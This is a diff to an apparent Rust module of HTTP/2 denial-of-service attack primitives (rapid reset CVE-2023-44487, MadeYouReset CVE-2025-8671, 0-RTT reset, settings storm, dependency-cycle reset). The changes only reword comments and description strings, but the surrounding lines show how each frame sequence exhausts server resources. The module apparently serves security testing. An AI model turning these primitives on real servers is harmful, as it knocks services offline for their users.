@@ -1,4 +1,4 @@
-//! HTTP/2 Rapid Reset attack primitives — CVE-2023-44487 family.
+//! HTTP/2 Rapid Reset attack primitives. CVE-2023-44487 family.
 //!
 //! This module generates raw HTTP/2 wire bytes for:
 //! - Classic rapid reset (HEADERS + immediate RST_STREAM, repeated)
@@ -19,7 +19,7 @@
 //! consuming server-side resources without the client having sent DATA.
 //! The exact frame ordering is: PRIORITY(stream=X, dep=Y, exclusive=1) →
 //! HEADERS(stream=X, END_HEADERS|END_STREAM). RFC 7540 §5.3.1 is silent on
-//! whether a PRIORITY frame referencing an idle/closed stream is legal —
+//! whether a PRIORITY frame referencing an idle/closed stream is legal 
 //! this ambiguity is the root cause.
 
 use crate::h2_evasion::{H2PriorityFrame, priority_frame_to_bytes};
@@ -62,7 +62,7 @@ fn frame_header(length: u32, frame_type: u8, flags: u8, stream_id: u32) -> [u8; 
 /// Bit 7 = 0 (no Huffman encoding). The 7-bit prefix can represent 0–126
 /// directly; values 127+ use the multibyte continuation format.
 fn hpack_string_length(len: usize) -> Vec<u8> {
-    // RFC 7541 §5.2 — not Huffman (H=0), 7-bit prefix.
+    // RFC 7541 §5.2 (not Huffman (H=0), 7-bit prefix).
     const PREFIX_MAX: usize = 127; // (1 << 7) - 1
     if len < PREFIX_MAX {
         vec![len as u8]
@@ -88,7 +88,7 @@ fn minimal_headers_payload(authority: &str) -> Vec<u8> {
     let mut buf = vec![0x82, 0x84, 0x87, 0x10, 0x01];
     // Value length encoded as HPACK 7-bit prefix varint (RFC 7541 §5.2).
     // Pre-fix: `auth_bytes.len() as u8` truncated silently for authority
-    // strings > 255 bytes, producing a corrupt HPACK block — the length
+    // strings > 255 bytes, producing a corrupt HPACK block, the length
     // byte would be wrong and the decoder would misparse all subsequent bytes.
     let auth_bytes = authority.as_bytes();
     buf.extend_from_slice(&hpack_string_length(auth_bytes.len()));
@@ -181,7 +181,7 @@ pub struct RapidResetBurst {
 ///
 /// Sends N pairs of (HEADERS frame, RST_STREAM CANCEL) on consecutive odd
 /// stream IDs. The server allocates a stream object and starts processing
-/// the request before seeing the RST_STREAM — at high N this exhausts
+/// the request before seeing the RST_STREAM, at high N this exhausts
 /// server thread pools without the client needing to receive responses.
 ///
 /// # Parameters
@@ -214,7 +214,7 @@ pub fn classic_rapid_reset(
     }
 }
 
-// ── Primitive 2: MadeYouReset — CVE-2025-8671 ────────────────────────────────
+// ── Primitive 2: MadeYouReset: CVE-2025-8671 ────────────────────────────────
 
 /// Descriptor for a MadeYouReset probe sequence.
 ///
@@ -282,7 +282,7 @@ pub fn made_you_reset(
         wire_bytes: wire,
         stream_id: sid,
         phantom_dep_stream_id: dep,
-        description: "CVE-2025-8671 MadeYouReset: PRIORITY(exclusive, idle dep) + HEADERS — \
+        description: "CVE-2025-8671 MadeYouReset: PRIORITY(exclusive, idle dep) + HEADERS. \
                        triggers server-side RST without client DATA",
     }
 }
@@ -318,22 +318,22 @@ pub struct ZeroRttRapidReset {
 /// Generate a 0-RTT rapid reset payload.
 ///
 /// The bytes are structured as a valid HTTP/2 client preface + SETTINGS +
-/// N×(HEADERS+RST) — identical to classic rapid reset but intended to be
+/// N×(HEADERS+RST), identical to classic rapid reset but intended to be
 /// injected as TLS 1.3 early data. Servers that process early data before
 /// completing the handshake cannot abort the connection without incurring
 /// the full handshake cost; this is the amplification surface.
 ///
-/// TLS-layer framing is NOT included — the caller's transport must wrap
+/// TLS-layer framing is NOT included, the caller's transport must wrap
 /// the returned bytes in a TLS 1.3 early-data record.
 #[must_use]
 pub fn zero_rtt_rapid_reset(authority: &str, stream_count: usize) -> ZeroRttRapidReset {
-    // Reuse classic_rapid_reset wire bytes — the 0-RTT distinction is at the
+    // Reuse classic_rapid_reset wire bytes, the 0-RTT distinction is at the
     // TLS layer, not the HTTP/2 framing layer.
     let burst = classic_rapid_reset(authority, stream_count, 0x8 /* CANCEL */);
     ZeroRttRapidReset {
         wire_bytes: burst.wire_bytes,
         stream_count: burst.stream_count,
-        description: "0-RTT rapid reset: HTTP/2 rapid reset burst sent as TLS 1.3 early data — \
+        description: "0-RTT rapid reset: HTTP/2 rapid reset burst sent as TLS 1.3 early data. \
                        server pays handshake cost to reject each stream",
     }
 }
@@ -382,12 +382,12 @@ pub fn settings_storm(frame_count: usize) -> SettingsStorm {
             ])
         };
         wire.extend_from_slice(&frame);
-        // No ACK — we're testing whether the server stalls waiting for our ACKs.
+        // No ACK (we're testing whether the server stalls waiting for our ACKs).
     }
     SettingsStorm {
         wire_bytes: wire,
         frame_count: n,
-        description: "Settings storm: alternating SETTINGS extremes without ACK — \
+        description: "Settings storm: alternating SETTINGS extremes without ACK. \
                        forces continuous renegotiation; exploits servers that process \
                        SETTINGS inline without queueing ACKs",
     }
@@ -424,7 +424,7 @@ pub fn settings_storm_with_resets(
     SettingsStorm {
         wire_bytes: wire,
         frame_count: n,
-        description: "Settings storm + rapid reset interleaved — dual resource exhaustion",
+        description: "Settings storm + rapid reset interleaved, dual resource exhaustion",
     }
 }
 
@@ -443,7 +443,7 @@ pub struct DependencyCycleReset {
 /// Sends a circular PRIORITY chain (stream 1→3→5→…→1) and then immediately
 /// fires HEADERS+RST on each stream in the cycle. Servers that attempt to
 /// walk the dependency tree before processing RST_STREAM recurse infinitely
-/// or discard the frames — either outcome is measurable.
+/// or discard the frames (either outcome is measurable).
 ///
 /// RFC 7540 §5.3.1 MUST NOT create cycles. The treatment is implementation-
 /// defined: some servers raise PROTOCOL_ERROR (0x1), some silently break the
@@ -484,7 +484,7 @@ pub fn dependency_cycle_reset(authority: &str, cycle_length: usize) -> Dependenc
     DependencyCycleReset {
         wire_bytes: wire,
         cycle_length: n,
-        description: "DEPENDENCY-cycle reset: circular PRIORITY loop + RST_STREAM flood — \
+        description: "DEPENDENCY-cycle reset: circular PRIORITY loop + RST_STREAM flood. \
                        triggers infinite tree-walk or PROTOCOL_ERROR on non-cycle-detecting servers",
     }
 }
@@ -772,7 +772,7 @@ mod tests {
             .iter()
             .filter(|(t, sid, _, _)| {
                 // type=SETTINGS(0x04), stream=0; ACK frames have flags=0x01 but
-                // parse_h2_frames doesn't capture flags — re-read from wire.
+                // parse_h2_frames doesn't capture flags (re-read from wire).
                 *t == 0x04 && *sid == 0
             })
             .count();
@@ -895,7 +895,7 @@ mod tests {
 
     #[test]
     fn hpack_string_length_127_uses_multibyte() {
-        // 127 = PREFIX_MAX — triggers continuation.
+        // 127 = PREFIX_MAX (triggers continuation).
         let encoded = hpack_string_length(127);
         assert!(encoded.len() > 1, "127 must use multi-byte encoding");
         // First byte must be 127 (saturated 7-bit prefix).
@@ -906,7 +906,7 @@ mod tests {
 
     #[test]
     fn hpack_string_length_256_correct_encoding() {
-        // 256 — the value that `as u8` would silently truncate to 0.
+        // 256 (the value that `as u8` would silently truncate to 0).
         // Correct: 127 (saturated prefix) + continuation byte(s) for 256-127=129.
         let encoded = hpack_string_length(256);
         // remainder = 256 - 127 = 129 ≥ 128 → needs 2 continuation bytes.
@@ -957,7 +957,7 @@ mod tests {
     fn classic_rapid_reset_long_authority_does_not_panic() {
         // A 300-byte authority would have caused a panic in the pre-fix code
         // via the truncated length byte making the HPACK block appear to have
-        // a 0-length :authority with 300 bytes of garbage following it —
+        // a 0-length :authority with 300 bytes of garbage following it 
         // though the panic would only surface at the remote parser, not here.
         // The fix must produce a well-formed HPACK block without panicking.
         let authority = "very-long-domain-".repeat(18); // 306 bytes
